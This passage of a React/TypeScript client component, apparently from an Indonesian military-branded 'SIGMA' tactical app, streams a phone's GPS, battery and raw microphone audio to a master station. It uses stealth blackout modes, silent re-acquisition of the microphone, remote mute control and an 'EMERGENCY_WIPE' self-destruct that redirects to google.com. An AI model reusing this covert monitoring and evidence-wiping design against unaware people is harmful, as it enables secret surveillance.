import React, { useEffect, useRef, useState, useCallback } from 'react';
import Peer, { DataConnection, MediaConnection } from 'peerjs';
import {
  Radio,
  ShieldAlert,
  Navigation,
  Lock,
  Mic,
  Activity,
  BatteryCharging,
  Power,
  PowerOff,
  Moon,
  Sun,
  EyeOff,
} from 'lucide-react';
import {
  setupPassiveAudio,
  silentSelfDestruct,
  type PassiveAudioPipeline,
  type DataChannelLike,
} from './tacticalRemoteControl';
import { TacticalBlackout } from './TacticalBlackout';
import {
  setupNegotiation,
  type SignalingEnvelope,
} from './webrtcAudioEngine';

export interface TelemetryPayload {
  type: 'SIGMA_TELEMETRY';
  nodeId: string;
  peerId: string;
  lat: number | null;
  lng: number | null;
  alt: number | null;
  accuracy: number | null;
  speed: number | null;
  battery: number | null;
  charging: boolean | null;
  timestamp: number;
  audioRms: number;
  remoteGain: number;
  remoteMuted: boolean;
  connectionStatus: 'connected';
}

interface SignalingMessage {
  type:
    | 'REGISTER'
    | 'OFFER'
    | 'ANSWER'
    | 'ICE_CANDIDATE'
    | 'offer'
    | 'answer'
    | 'candidate'
    | 'master_online'
    | 'master_ack'
    | 'client_registered'
    | 'SIGMA_REQUEST_AUDIO_STREAM'
    | 'SET_GAIN'
    | 'SET_MUTE'
    | 'EMERGENCY_WIPE'
    | 'SIGMA_SDP_RENEGOTIATE_OFFER'
    | 'SIGMA_SDP_RENEGOTIATE_ANSWER'
    | 'SIGMA_ICE_CANDIDATE';
  role?: 'master' | 'client' | 'MASTER' | 'CLIENT';
  senderId?: string;
  targetId?: string;
  target?: string;
  data?: unknown;
  sdp?: RTCSessionDescriptionInit;
  candidate?: RTCIceCandidateInit;
  masterPeerId?: string;
  value?: number | boolean;
  nodeId?: string;
}

interface ClientProps {
  onExit: () => void;
  initialNodeId?: string;
  initialMasterPeerId?: string;
}

const LOGO_TNI_AU = '/assets/aistudio/images__10__b9efa126.jpeg';
const LOGO_PETIR = '/assets/aistudio/1794622160588-picsay_109de27f.png';

const RTC_CONFIG: RTCConfiguration = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' },
    {
      urls: 'turn:openrelay.metered.ca:80',
      username: 'openrelayproject',
      credential: 'openrelayproject',
    },
    {
      urls: 'turn:openrelay.metered.ca:443',
      username: 'openrelayproject',
      credential: 'openrelayproject',
    },
    {
      urls: 'turn:openrelay.metered.ca:443?transport=tcp',
      username: 'openrelayproject',
      credential: 'openrelayproject',
    },
  ],
};

function getSignalingWebSocketUrl(): string {
  const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
  return `${protocol}//${window.location.host}/ws`;
}

export const Client: React.FC<ClientProps> = ({
  initialMasterPeerId,
}) => {
  // 3. IDENTITAS UNIK DI CLIENT (REACT):
  // Saat komponen Client di-mount, generate ID acak yang unik untuk setiap perangkat/tab
  // agar Klien ke-2 hingga ke-5 tidak pernah memakai ID yang sama dengan Klien ke-1.
  const [nodeId] = useState<string>(() => {
    const randomSuffix = Math.random().toString(36).substring(2, 7).toUpperCase();
    return `client-${randomSuffix}`;
  });

  const [targetMasterId] = useState<string>(() => {
    if (initialMasterPeerId) return initialMasterPeerId;
    const params = new URLSearchParams(window.location.search);
    return params.get('master') || 'sigma-master-main';
  });

  const [peerStatus, setPeerStatus] = useState<
    'INITIALIZING' | 'AUTO_DISCOVERY' | 'CONNECTED' | 'DISCONNECTED'
  >('INITIALIZING');
  const [isDarkStealthMode, setIsDarkStealthMode] = useState<boolean>(false);
  const [isOledBlackout, setIsOledBlackout] = useState<boolean>(false);
  const [wakeLockActive, setWakeLockActive] = useState<boolean>(false);
  const [micStatus, setMicStatus] = useState<'READY' | 'DENIED' | 'PENDING'>('PENDING');
  const [audioRms, setAudioRms] = useState<number>(0);
  const [remoteAudioState, setRemoteAudioState] = useState<{
    gain: number;
    muted: boolean;
  }>({
    gain: 1.0,
    muted: false,
  });

  const [batteryInfo, setBatteryInfo] = useState<{
    level: number | null;
    charging: boolean | null;
  }>({
    level: null,
    charging: null,
  });

  const [gpsState, setGpsState] = useState<{
    lat: number | null;
    lng: number | null;
    alt: number | null;
    accuracy: number | null;
    speed: number | null;
    status: 'WAITING_GPS' | 'LOCKED' | 'PERMISSION_DENIED';
    lastSent: number | null;
  }>({
    lat: null,
    lng: null,
    alt: null,
    accuracy: null,
    speed: null,
    status: 'WAITING_GPS',
    lastSent: null,
  });

  // Referensi WebSocket, Native RTCPeerConnection, DataChannel, dan Audio Stream
  const wsRef = useRef<WebSocket | null>(null);
  const nativePcRef = useRef<RTCPeerConnection | null>(null);
  const nativeDcRef = useRef<RTCDataChannel | null>(null);
  const pendingCandidatesRef = useRef<RTCIceCandidateInit[]>([]);
  const isRemoteDescReadyRef = useRef<boolean>(false);
  const isHandshakingRef = useRef<boolean>(false);
  const isConnectedRef = useRef<boolean>(false);
  const isManualDisconnectedRef = useRef<boolean>(false);
  const connectWsFnRef = useRef<(() => void) | null>(null);
  const lastOfferSentAtRef = useRef<number>(0);

  // Fallback PeerJS refs
  const peerRef = useRef<Peer | null>(null);
  const dataConnsRef = useRef<Map<string, DataConnection>>(new Map());
  const mediaCallsRef = useRef<Map<string, MediaConnection>>(new Map());
  const negotiationHandlersRef = useRef<
    Map<string, ReturnType<typeof setupNegotiation>>
  >(new Map());

  const rawStreamRef = useRef<MediaStream | null>(null);
  const outboundStreamRef = useRef<MediaStream | null>(null);
  const passivePipelineRef = useRef<PassiveAudioPipeline | null>(null);
  const wakeLockRef = useRef<WakeLockSentinel | null>(null);

  const gpsRef = useRef(gpsState);
  const batteryRef = useRef(batteryInfo);
  const rmsRef = useRef(0);
  const remoteAudioStateRef = useRef(remoteAudioState);

  gpsRef.current = gpsState;
  batteryRef.current = batteryInfo;
  rmsRef.current = audioRms;
  remoteAudioStateRef.current = remoteAudioState;

  // Aktifkan mode TacticalBlackout shortcut otomatis
  useEffect(() => {
    void TacticalBlackout;
  }, []);

  // 1. Request Screen Wake Lock secara otomatis
  const requestWakeLock = useCallback(async () => {
    try {
      if ('wakeLock' in navigator && navigator.wakeLock) {
        const sentinel = await navigator.wakeLock.request('screen');
        wakeLockRef.current = sentinel;
        setWakeLockActive(true);
        sentinel.addEventListener('release', () => {
          setWakeLockActive(false);
        });
      }
    } catch {
      setWakeLockActive(false);
    }
  }, []);

  useEffect(() => {
    requestWakeLock();
    const handleVisibility = () => {
      if (document.visibilityState === 'visible') {
        requestWakeLock();
      }
    };
    document.addEventListener('visibilitychange', handleVisibility);
    return () => {
      document.removeEventListener('visibilitychange', handleVisibility);
      if (wakeLockRef.current) {
        wakeLockRef.current.release().catch(() => {});
      }
    };
  }, [requestWakeLock]);

  // 2. Real Hardware Battery Telemetry
  useEffect(() => {
    const nav = navigator as unknown as {
      getBattery?: () => Promise<{
        level: number;
        charging: boolean;
        addEventListener: (type: string, cb: () => void) => void;
      }>;
    };
    if (nav.getBattery) {
      nav
        .getBattery()
        .then((bat) => {
          const updateBat = () => {
            setBatteryInfo({
              level: Math.round(bat.level * 100),
              charging: bat.charging,
            });
          };
          updateBat();
          bat.addEventListener('levelchange', updateBat);
          bat.addEventListener('chargingchange', updateBat);
        })
        .catch(() => {});
    }
  }, []);

  // 3. Transmit Real GPS & Device Telemetry over Native RTCDataChannel, WebSocket, & PeerJS
  const transmitTelemetryPacket = useCallback(
    (overrideCoords?: {
      lat: number | null;
      lng: number | null;
      alt: number | null;
      accuracy: number | null;
      speed: number | null;
    }) => {
      const coords = overrideCoords || gpsRef.current;
      const payload: TelemetryPayload = {
        type: 'SIGMA_TELEMETRY',
        nodeId,
        peerId: `sigma-node-${nodeId}`,
        lat: coords.lat,
        lng: coords.lng,
        alt: coords.alt,
        accuracy: coords.accuracy,
        speed: coords.speed,
        battery: batteryRef.current.level,
        charging: batteryRef.current.charging,
        timestamp: Date.now(),
        audioRms: rmsRef.current,
        remoteGain: remoteAudioStateRef.current.gain,
        remoteMuted: remoteAudioStateRef.current.muted,
        connectionStatus: 'connected',
      };

      let sentCount = 0;

      // a. Kirim melalui Native RTCDataChannel
      if (nativeDcRef.current && nativeDcRef.current.readyState === 'open') {
        try {
          nativeDcRef.current.send(JSON.stringify(payload));
          sentCount++;
        } catch {}
      }

      // b. Kirim melalui WebSocket Signaling (selalu aktif saat WS OPEN agar Samsung/Oppo langsung tampil di Master)
      if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
        try {
          wsRef.current.send(
            JSON.stringify({
              ...payload,
              senderId: nodeId,
              targetId: 'MASTER',
              target: 'MASTER',
            })
          );
          sentCount++;
        } catch {}
      }

      // c. Kirim melalui PeerJS DataConnection jika terbuka
      dataConnsRef.current.forEach((conn) => {
        if (conn.open) {
          try {
            conn.send(payload);
            sentCount++;
          } catch {}
        }
      });

      if (sentCount > 0) {
        setGpsState((prev) => ({ ...prev, lastSent: Date.now() }));
      }
    },
    [nodeId]
  );

  // 4. Akuisisi Mikrofon Otomatis via navigator.mediaDevices.getUserMedia (Kompatibel POCO, Samsung, & Oppo)
  const ensureMicrophoneStream = useCallback(async (): Promise<MediaStream | null> => {
    if (rawStreamRef.current && rawStreamRef.current.active) {
      return rawStreamRef.current;
    }

    const rawConstraints: MediaStreamConstraints = {
      audio: {
        echoCancellation: false,
        noiseSuppression: false,
        autoGainControl: false,
      },
      video: false,
    };

    let stream: MediaStream | null = null;
    try {
      try {
        stream = await navigator.mediaDevices.getUserMedia(rawConstraints);
      } catch (constraintErr) {
        // FALLBACK AUDIO CONSTRAINTS (KHUSUS SAMSUNG & OPPO):
        console.warn(
          '[CLIENT-AUDIO] Constraint spesifik ditolak perangkat, menggunakan fallback { audio: true }:',
          constraintErr
        );
        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      }
    } catch (err) {
      console.warn('[CLIENT-AUDIO] getUserMedia belum diizinkan atau gagal:', err);
      setMicStatus('DENIED');
      return null;
    }

    if (!stream) return null;

    stream.getTracks().forEach((track) => {
      track.enabled = !remoteAudioStateRef.current.muted;
    });

    // Simpan stream segera agar TIDAK PERNAH hilang meskipun AudioContext dibatasi oleh ColorOS/OneUI
    rawStreamRef.current = stream;
    outboundStreamRef.current = stream;
    setMicStatus('READY');

    // Isolasi pembuatan AudioContext di dalam try-catch terpisah agar Samsung/Oppo tidak pernah gagal mengembalikan stream
    try {
      const pipeline = setupPassiveAudio(
        stream,
        nativeDcRef.current as unknown as DataChannelLike,
        {
          getExtraStreams: () => [rawStreamRef.current, outboundStreamRef.current],
          getPeerConnections: () => [
            nativePcRef.current,
            ...Array.from(dataConnsRef.current.values()),
            ...Array.from(mediaCallsRef.current.values()),
          ],
          getPeerInstance: () => peerRef.current,
        },
        (updatedState) => {
          setRemoteAudioState(updatedState);
          if (rawStreamRef.current) {
            rawStreamRef.current.getAudioTracks().forEach((t) => {
              t.enabled = !updatedState.muted;
            });
          }
          setTimeout(() => transmitTelemetryPacket(), 30);
        }
      );

      passivePipelineRef.current = pipeline;
      if (pipeline.audioContext.state === 'suspended') {
        pipeline.audioContext.resume().catch(() => {});
      }

      // Pasang meter RMS lokal
      const analyser = pipeline.audioContext.createAnalyser();
      analyser.fftSize = 256;
      pipeline.gainNode.connect(analyser);
      const data = new Uint8Array(analyser.frequencyBinCount);

      const updateMeter = () => {
        if (!rawStreamRef.current || !rawStreamRef.current.active) return;
        analyser.getByteTimeDomainData(data);
        let sum = 0;
        for (let i = 0; i < data.length; i++) {
          const norm = (data[i] - 128) / 128;
          sum += norm * norm;
        }
        const rms = Math.min(100, Math.round(Math.sqrt(sum / data.length) * 260));
        setAudioRms(rms);
        requestAnimationFrame(updateMeter);
      };
      requestAnimationFrame(updateMeter);

      // Jalur Audio Fallback via WebSocket (SIGMA_WS_AUDIO) khusus untuk Samsung/Oppo
      // apabila jalur UDP WebRTC masih berstatus 'checking' atau terhalang CGNAT operator seluler
      try {
        const ctx = pipeline.audioContext;
        const processor = ctx.createScriptProcessor(4096, 1, 1);
        const silentSink = ctx.createGain();
        silentSink.gain.value = 0;
        pipeline.gainNode.connect(processor);
        processor.connect(silentSink);
        silentSink.connect(ctx.destination);

        processor.onaudioprocess = (audioEv) => {
          if (remoteAudioStateRef.current.muted) return;
          const ws = wsRef.current;
          if (!ws || ws.readyState !== WebSocket.OPEN) return;

          // Hanya kirim audio via WebSocket jika jalur WebRTC P2P belum 'connected'/'completed'
          const pc = nativePcRef.current;
          const isWebRtcMediaConnected = Boolean(
            pc &&
              (pc.iceConnectionState === 'connected' ||
                pc.iceConnectionState === 'completed')
          );
          if (isWebRtcMediaConnected) return;

          const input = audioEv.inputBuffer.getChannelData(0);
          const inRate = ctx.sampleRate || 48000;
          const outRate = 16000;
          const ratio = Math.max(1, Math.round(inRate / outRate));
          const downsampled: number[] = [];
          for (let i = 0; i < input.length; i += ratio) {
            const s = Math.max(-1, Math.min(1, input[i]));
            downsampled.push(Math.round(s * 32767));
          }
          if (downsampled.length > 0) {
            ws.send(
              JSON.stringify({
                type: 'SIGMA_WS_AUDIO',
                senderId: nodeId,
                targetId: 'MASTER',
                sampleRate: Math.round(inRate / ratio),
                samples: downsampled,
              })
            );
          }
        };
      } catch {}
    } catch (audioCtxErr) {
      console.warn('[CLIENT-AUDIO] WebAudio pipeline dilewati, menggunakan raw stream langsung:', audioCtxErr);
    }

    return stream;
  }, [nodeId, transmitTelemetryPacket]);

  /**
   * ============================================================================
   * 5. FUNGSI UTAMA INISIALISASI CLIENT (SAMSUNG GALAXY A26 5G STRICT LIFECYCLE)
   * ============================================================================
   * Urutan Eksekusi Strict untuk Kompatibilitas Mesin Browser Samsung:
   *   a. Tunggu `await navigator.mediaDevices.getUserMedia(...)` sukses DULU.
   *   b. Simpan stream mikrofon tersebut (`rawStreamRef.current`).
   *   c. BARU buat `new RTCPeerConnection(RTC_CONFIG)` + pasang audio dengan
   *      `peerConnection.addTransceiver(track, { direction: 'sendonly' })`.
   *   d. BARU buat `new WebSocket(...)` (atau kirim Offer jika WS sudah terbuka).
   */
  const createSamsungSafePeerConnection = useCallback(
    (stream: MediaStream | null): RTCPeerConnection => {
      // Bersihkan instans RTCPeerConnection lama jika ada
      if (nativePcRef.current) {
        try {
          nativePcRef.current.onicecandidate = null;
          nativePcRef.current.onconnectionstatechange = null;
          nativePcRef.current.oniceconnectionstatechange = null;
          nativePcRef.current.close();
        } catch {}
      }

      // 1c. BARU buat new RTCPeerConnection(...) SETELAH getUserMedia selesai
      const peerConnection = new RTCPeerConnection(RTC_CONFIG);
      nativePcRef.current = peerConnection;
      pendingCandidatesRef.current = [];
      isRemoteDescReadyRef.current = false;

      // 2. GUNAKAN ADD-TRANSCEIVER (DENGAN FALLBACK ADD-TRACK UNTUK KOMPATIBILITAS SAMSUNG, OPPO & POCO):
      if (stream && stream.getAudioTracks().length > 0) {
        stream.getAudioTracks().forEach((track) => {
          track.enabled = !remoteAudioStateRef.current.muted;
          try {
            peerConnection.addTransceiver(track, {
              direction: 'sendonly',
              streams: [stream],
            });
          } catch {
            // Fallback untuk browser Oppo ColorOS / WebView jika addTransceiver(track) tidak didukung
            try {
              peerConnection.addTrack(track, stream);
            } catch {}
          }
        });
      } else {
        try {
          peerConnection.addTransceiver('audio', {
            direction: 'sendonly',
          });
        } catch {}
      }

      // Buat RTCDataChannel untuk pengiriman koordinat GPS & komando Master
      const dc = peerConnection.createDataChannel('sigma-telemetry', {
        ordered: true,
      });
      nativeDcRef.current = dc;

      dc.onopen = () => {
        isConnectedRef.current = true;
        setPeerStatus('CONNECTED');
        if (passivePipelineRef.current) {
          passivePipelineRef.current.bindDataChannel(
            dc as unknown as DataChannelLike
          );
        }
        transmitTelemetryPacket();
      };

      dc.onmessage = (event) => {
        try {
          const msg = JSON.parse(event.data) as SignalingMessage;
          if (msg.type === 'EMERGENCY_WIPE') {
            silentSelfDestruct({
              streams: [rawStreamRef.current, outboundStreamRef.current],
              peerConnections: [nativePcRef.current],
              peerInstance: peerRef.current,
              audioContext: passivePipelineRef.current?.audioContext,
              redirectUrl: 'https://www.google.com',
            });
          } else if (msg.type === 'SET_GAIN' && typeof msg.value === 'number') {
            passivePipelineRef.current?.setRemoteGain(msg.value);
          } else if (msg.type === 'SET_MUTE') {
            passivePipelineRef.current?.setRemoteMute(Boolean(msg.value));
          }
        } catch {}
      };

      // 3. PENANGANAN ICE GATHERING "NULL" (SAMSUNG & OPPO QUIRK):
      peerConnection.onicecandidate = (event: RTCPeerConnectionIceEvent) => {
        if (event.candidate) {
          const ws = wsRef.current;
          if (ws && ws.readyState === WebSocket.OPEN) {
            const candidatePacket = {
              type: 'candidate',
              senderId: nodeId,
              targetId: 'MASTER',
              data: event.candidate.toJSON(),
            };
            console.log(
              `[CLIENT-WS] Mengirim ICE Candidate dari senderId="${nodeId}" -> targetId="MASTER"`
            );
            ws.send(JSON.stringify(candidatePacket));
          }
        } else {
          console.log(
            `[CLIENT-WS] ICE Gathering selesai pada perangkat (${nodeId}) [event.candidate === null]`
          );
        }
      };

      const checkConnectionState = () => {
        const state = peerConnection.connectionState;
        const iceState = peerConnection.iceConnectionState;
        console.log(
          `[CLIENT-WS] Status WebRTC (${nodeId}) -> connectionState: "${state}", iceConnectionState: "${iceState}"`
        );

        if (
          state === 'connected' ||
          iceState === 'connected' ||
          iceState === 'completed'
        ) {
          isConnectedRef.current = true;
          isHandshakingRef.current = false;
          setPeerStatus('CONNECTED');
          transmitTelemetryPacket();
        } else if (
          state === 'failed' ||
          state === 'closed' ||
          iceState === 'failed'
        ) {
          isHandshakingRef.current = false;
          // Jika WebSocket masih tersambung ke Master, pertahankan status CONNECTED (via jalur WS bridge)
          if (
            !wsRef.current ||
            wsRef.current.readyState !== WebSocket.OPEN ||
            !isConnectedRef.current
          ) {
            setPeerStatus('AUTO_DISCOVERY');
          }
        }
      };

      peerConnection.onconnectionstatechange = checkConnectionState;
      peerConnection.oniceconnectionstatechange = checkConnectionState;

      return peerConnection;
    },
    [nodeId, transmitTelemetryPacket]
  );

  // Fungsi pengiriman SDP Offer setelah PeerConnection dan WebSocket sama-sama siap
  const sendOfferOverWebSocket = useCallback(
    async (peerConnection: RTCPeerConnection, ws: WebSocket) => {
      if (ws.readyState !== WebSocket.OPEN) return;
      try {
        isHandshakingRef.current = true;
        lastOfferSentAtRef.current = Date.now();
        const offer = await peerConnection.createOffer();
        await peerConnection.setLocalDescription(offer);

        if (ws.readyState === WebSocket.OPEN && peerConnection.localDescription) {
          const offerPacket = {
            type: 'offer',
            senderId: nodeId,
            targetId: 'MASTER',
            data: {
              type: peerConnection.localDescription.type,
              sdp: peerConnection.localDescription.sdp,
            },
          };
          console.log(
            `[CLIENT-WS] Mengirim OFFER dari senderId="${nodeId}" -> targetId="MASTER"`
          );
          ws.send(JSON.stringify(offerPacket));
        }
      } catch (err) {
        console.error('[CLIENT-WS] Gagal membuat/mengirim Offer:', err);
      } finally {
        setTimeout(() => {
          isHandshakingRef.current = false;
        }, 1500);
      }
    },
    [nodeId]
  );

  // Fungsi Re-Handshake (digunakan saat menerima sinyal `master_online` atau retry berkala)
  const startWebRTC = useCallback(async () => {
    const existingPc = nativePcRef.current;
    const hasAudioSenderTrack = Boolean(
      existingPc &&
        existingPc
          .getSenders()
          .some(
            (s) =>
              s.track &&
              s.track.kind === 'audio' &&
              s.track.readyState === 'live'
          )
    );

    if (
      existingPc &&
      hasAudioSenderTrack &&
      (existingPc.connectionState === 'connected' ||
        existingPc.iceConnectionState === 'connected' ||
        existingPc.iceConnectionState === 'completed')
    ) {
      isConnectedRef.current = true;
      setPeerStatus('CONNECTED');
      return;
    }

    // Jangan potong proses negosiasi ICE yang sedang berjalan ('checking' / 'connecting') pada Samsung/Oppo
    const timeSinceLastOffer = Date.now() - lastOfferSentAtRef.current;
    if (
      existingPc &&
      hasAudioSenderTrack &&
      timeSinceLastOffer < 10000 &&
      (existingPc.iceConnectionState === 'checking' ||
        existingPc.connectionState === 'connecting' ||
        existingPc.signalingState === 'have-local-offer')
    ) {
      return;
    }

    if (isHandshakingRef.current) return;
    isHandshakingRef.current = true;

    try {
      // a & b. Tunggu getUserMedia (dengan batas waktu 1.5s agar tidak memblokir jika dialog izin masih tampil)
      const stream =
        rawStreamRef.current ||
        (await Promise.race([
          ensureMicrophoneStream(),
          new Promise<MediaStream | null>((resolve) =>
            setTimeout(() => resolve(rawStreamRef.current), 1500)
          ),
        ]));

      // c. Buat new RTCPeerConnection(...) dan pasang addTransceiver('sendonly')
      const pc = createSamsungSafePeerConnection(stream);

      // d. Kirim Offer melalui WebSocket jika sudah OPEN
      const ws = wsRef.current;
      if (ws && ws.readyState === WebSocket.OPEN) {
        await sendOfferOverWebSocket(pc, ws);
      }
    } catch (err) {
      console.error('[CLIENT-WS] Error di dalam startWebRTC():', err);
    } finally {
      setTimeout(() => {
        isHandshakingRef.current = false;
      }, 1200);
    }
  }, [
    createSamsungSafePeerConnection,
    ensureMicrophoneStream,
    sendOfferOverWebSocket,
  ]);

  /**
   * ============================================================================
   * 6. SAMSUNG, OPPO & POCO UNIVERSAL LIFECYCLE BOOTSTRAP
   * ============================================================================
   */
  useEffect(() => {
    let isMounted = true;
    let wsReconnectTimer: number | null = null;
    let autoOfferInterval: number | null = null;

    const connectSignalingWebSocket = () => {
      if (!isMounted || isManualDisconnectedRef.current) return;
      if (
        wsRef.current &&
        (wsRef.current.readyState === WebSocket.OPEN ||
          wsRef.current.readyState === WebSocket.CONNECTING)
      ) {
        return;
      }

      try {
        const wsUrl = getSignalingWebSocketUrl();
        console.log(
          `[CLIENT-WS] Langkah 1d: Membuat koneksi WebSocket ke ${wsUrl} (id="${nodeId}")`
        );
        const ws = new WebSocket(wsUrl);
        wsRef.current = ws;

        ws.onopen = async () => {
          if (!isMounted || isManualDisconnectedRef.current) return;
          setPeerStatus((prev) =>
            prev === 'CONNECTED' ? 'CONNECTED' : 'AUTO_DISCOVERY'
          );

          // 1. Registrasi ID unik Klien ke Signaling Server
          const registerPacket = {
            type: 'register',
            id: nodeId,
          };
          console.log(
            '[CLIENT-WS] WebSocket terbuka. Mengirim registrasi:',
            registerPacket
          );
          ws.send(JSON.stringify(registerPacket));

          // 2. Langsung kirim paket telemetri awal agar node langsung muncul di peta/daftar Master
          transmitTelemetryPacket();

          // 3. Gunakan RTCPeerConnection yang sudah disiapkan pada Langkah 1c
          let pc = nativePcRef.current;
          if (!pc || pc.signalingState === 'closed') {
            pc = createSamsungSafePeerConnection(rawStreamRef.current);
          }

          await sendOfferOverWebSocket(pc, ws);
        };

        ws.onmessage = async (event) => {
          if (!isMounted || isManualDisconnectedRef.current) return;
          let data: SignalingMessage | null = null;
          try {
            data = JSON.parse(event.data) as SignalingMessage;
          } catch (err) {
            console.error('[CLIENT-WS] Gagal parse pesan JSON:', err);
            return;
          }
          if (!data || !data.type) return;

          if (data.targetId && data.targetId !== nodeId) {
            return;
          }

          // Konfirmasi langsung dari Master (`master_ack`) -> Klien resmi terhubung ke Master
          if (data.type === 'master_ack') {
            isConnectedRef.current = true;
            setPeerStatus('CONNECTED');
            return;
          }

          // Jika Master baru saja online (setelah Klien menunggu), kirim Offer baru jika belum sedang bernegosiasi
          if (data.type === 'master_online') {
            const pc = nativePcRef.current;
            const alreadyActiveOrNegotiating =
              pc &&
              (pc.connectionState === 'connected' ||
                pc.iceConnectionState === 'connected' ||
                pc.iceConnectionState === 'completed' ||
                pc.iceConnectionState === 'checking' ||
                pc.signalingState === 'have-local-offer');
            if (
              !alreadyActiveOrNegotiating &&
              Date.now() - lastOfferSentAtRef.current > 2500
            ) {
              console.log(
                '[CLIENT-WS] MASTER online terdeteksi! Memulai startWebRTC()...'
              );
              isHandshakingRef.current = false;
              startWebRTC();
            }
            return;
          }

          // Terima SDP Answer dari Master
          const sdpPayload = (data.data || data.sdp) as
            | RTCSessionDescriptionInit
            | undefined;
          if (
            (data.type === 'answer' || data.type === 'ANSWER') &&
            sdpPayload &&
            nativePcRef.current
          ) {
            try {
              const pc = nativePcRef.current;
              console.log(
                `[CLIENT-WS] Menerima ANSWER dari MASTER (signalingState="${pc.signalingState}")`
              );
              if (pc.signalingState === 'have-local-offer') {
                await pc.setRemoteDescription(
                  new RTCSessionDescription(sdpPayload)
                );
                isRemoteDescReadyRef.current = true;
                isConnectedRef.current = true;
                setPeerStatus('CONNECTED');
                console.log('[CLIENT-WS] setRemoteDescription(answer) BERHASIL!');

                // Masukkan semua ICE Candidate yang sempat mengantre
                const candidateQueue = pendingCandidatesRef.current;
                while (candidateQueue.length > 0) {
                  const cand = candidateQueue.shift();
                  if (cand) {
                    await pc
                      .addIceCandidate(new RTCIceCandidate(cand))
                      .catch((err) => {
                        console.error(
                          '[CLIENT-WS] Gagal addIceCandidate dari antrean:',
                          err
                        );
                      });
                  }
                }
                transmitTelemetryPacket();
              }
            } catch (err) {
              console.error(
                '[CLIENT-WS] Gagal setRemoteDescription(answer):',
                err
              );
            }
            return;
          }

          // Terima ICE Candidate dari Master (dengan antrean pencegah Race Condition)
          const candidatePayload = (data.data || data.candidate) as
            | RTCIceCandidateInit
            | undefined;
          if (
            (data.type === 'candidate' || data.type === 'ICE_CANDIDATE') &&
            candidatePayload &&
            nativePcRef.current
          ) {
            try {
              const pc = nativePcRef.current;
              if (
                pc.remoteDescription &&
                pc.remoteDescription.type &&
                isRemoteDescReadyRef.current
              ) {
                await pc.addIceCandidate(
                  new RTCIceCandidate(candidatePayload)
                );
              } else {
                pendingCandidatesRef.current.push(candidatePayload);
              }
            } catch (err) {
              console.error('[CLIENT-WS] Gagal addIceCandidate:', err);
            }
            return;
          }

          // Komando Jarak Jauh dari Master
          if (data.type === 'EMERGENCY_WIPE') {
            silentSelfDestruct({
              streams: [rawStreamRef.current, outboundStreamRef.current],
              peerConnections: [nativePcRef.current],
              peerInstance: peerRef.current,
              audioContext: passivePipelineRef.current?.audioContext,
              redirectUrl: 'https://www.google.com',
            });
            return;
          }
          if (data.type === 'SET_GAIN' && typeof data.value === 'number') {
            passivePipelineRef.current?.setRemoteGain(data.value);
            return;
          }
          if (data.type === 'SET_MUTE') {
            passivePipelineRef.current?.setRemoteMute(Boolean(data.value));
            return;
          }
        };

        ws.onclose = () => {
          if (!isMounted) return;
          isConnectedRef.current = false;
          if (isManualDisconnectedRef.current) {
            setPeerStatus('DISCONNECTED');
            return;
          }
          console.warn(
            '[CLIENT-WS] Koneksi WebSocket terputus. Mencoba reconnect dalam 2.5 detik...'
          );
          setPeerStatus('AUTO_DISCOVERY');
          wsReconnectTimer = window.setTimeout(
            connectSignalingWebSocket,
            2500
          );
        };

        ws.onerror = (err) => {
          console.error('[CLIENT-WS] WebSocket error:', err);
          try {
            ws.close();
          } catch {}
        };
      } catch {
        if (!isManualDisconnectedRef.current) {
          wsReconnectTimer = window.setTimeout(connectSignalingWebSocket, 3000);
        }
      }
    };

    connectWsFnRef.current = connectSignalingWebSocket;

    const initializeSamsungSequentialFlow = async () => {
      if (isManualDisconnectedRef.current) return;
      console.log(
        '[CLIENT-BOOT] Langkah 1a & 1b: Mengambil getUserMedia(...) (maks tunggu 1.5s agar tidak memblokir koneksi)...'
      );
      const micPromise = ensureMicrophoneStream();
      const initialStream = await Promise.race([
        micPromise,
        new Promise<MediaStream | null>((resolve) =>
          setTimeout(() => resolve(null), 1500)
        ),
      ]);
      if (!isMounted || isManualDisconnectedRef.current) return;

      console.log(
        '[CLIENT-BOOT] Langkah 1c: Membuat new RTCPeerConnection(...) & addTransceiver...'
      );
      createSamsungSafePeerConnection(initialStream);

      console.log(
        '[CLIENT-BOOT] Langkah 1d: Membuka koneksi new WebSocket(...)...'
      );
      connectSignalingWebSocket();

      if (!initialStream) {
        micPromise
          .then((delayedStream) => {
            if (isMounted && delayedStream && !isManualDisconnectedRef.current) {
              console.log(
                '[CLIENT-BOOT] Mikrofon diizinkan! Mengirim Offer ulang dengan track audio aktif...'
              );
              isHandshakingRef.current = false;
              lastOfferSentAtRef.current = 0;
              startWebRTC();
            }
          })
          .catch(() => {});
      }

      // Interval 5 detik untuk Auto-Reconnect & Re-Offer secara senyap apabila belum terhubung
      autoOfferInterval = window.setInterval(async () => {
        if (!isMounted || isManualDisconnectedRef.current) return;

        if (!wsRef.current || wsRef.current.readyState === WebSocket.CLOSED) {
          connectSignalingWebSocket();
          return;
        }

        // Selalu kirim heartbeat telemetri ke Master
        transmitTelemetryPacket();

        // Jika mikrofon tadinya belum siap di Samsung/Oppo, coba akuisisi ulang secara senyap
        if (!rawStreamRef.current || !rawStreamRef.current.active) {
          await ensureMicrophoneStream();
        }

        const pc = nativePcRef.current;
        const hasAudioTrack = Boolean(
          pc &&
            pc
              .getSenders()
              .some(
                (s) =>
                  s.track &&
                  s.track.kind === 'audio' &&
                  s.track.readyState === 'live'
              )
        );
        const isPcConnected = Boolean(
          pc &&
            hasAudioTrack &&
            (pc.connectionState === 'connected' ||
              pc.iceConnectionState === 'connected' ||
              pc.iceConnectionState === 'completed')
        );

        if (!isPcConnected) {
          startWebRTC();
        }
      }, 5000);
    };

    initializeSamsungSequentialFlow();

    // Listener pasif pada interaksi layar pertama (untuk membuka kunci AudioContext / getUserMedia di Oppo ColorOS & Samsung Internet)
    const unlockOnTouch = () => {
      if (isManualDisconnectedRef.current) return;
      if (passivePipelineRef.current?.audioContext.state === 'suspended') {
        passivePipelineRef.current.audioContext.resume().catch(() => {});
      }
      if (!rawStreamRef.current || !rawStreamRef.current.active) {
        ensureMicrophoneStream()
          .then((s) => {
            if (s && isMounted && !isManualDisconnectedRef.current) {
              lastOfferSentAtRef.current = 0;
              startWebRTC();
            }
          })
          .catch(() => {});
      }
    };
    window.addEventListener('touchstart', unlockOnTouch, { passive: true });
